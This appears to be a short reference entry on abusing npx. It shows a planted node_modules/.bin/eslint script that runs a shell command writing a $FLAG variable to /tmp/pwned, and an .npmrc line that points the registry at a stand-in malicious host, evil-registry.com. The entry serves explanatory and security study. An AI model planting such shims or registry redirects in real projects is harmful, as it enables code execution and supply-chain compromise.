---
title: npx
tags:
- cli
- input-file
- eval-js
references:
- https://www.npmjs.com/package/npx
- https://docs.npmjs.com/cli/v11/commands/npx
files: [node_modules/.bin/, .npmrc]
---

`npx` is a command-line tool that executes binaries from npm packages without needing to install them globally. It runs the command by first checking in the local project's `node_modules/.bin` directory, then a central cache, and finally by temporarily downloading the package from the npm registry if not found elsewhere.

If `npx eslint` is run, an attacker could write a file `node_modules/.bin/eslint` so that it is executed instead of eslint legitimate binary. 

```js
#!/usr/bin/env node
const { exec } = require('node:child_process');
exec('echo "$FLAG" > /tmp/pwned');
```

`npx` does not have its own dedicated configuration file, but instead inherits its settings directly from npm's `.npmrc` files. This means any custom registries, proxy settings, or authentication tokens you have configured for npm will be automatically used by npx when it fetches and runs packages.

If `.npmrc` redirects to an attacker-controlled registry, npx binaries will be downloaded from the malicious registry. 

```
registry=https://evil-registry.com
```